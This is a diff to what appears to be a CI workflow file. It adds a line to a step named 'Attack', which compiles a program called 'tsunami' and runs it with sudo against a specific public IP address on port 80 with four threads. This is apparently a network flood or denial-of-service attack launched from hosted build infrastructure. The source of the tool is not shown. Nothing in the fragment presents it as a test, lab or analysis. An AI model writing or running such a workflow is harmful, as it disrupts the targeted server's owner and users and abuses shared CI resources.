@@ -15,5 +15,6 @@ jobs:
 
       - name: Attack
         run: |
+          cat /proc/sys/net/core/somaxconn
           gcc -std=c2x -march=native -O3 -o tsunami tsunami.c -pthread
           sudo ./tsunami 195.154.210.21 80 4
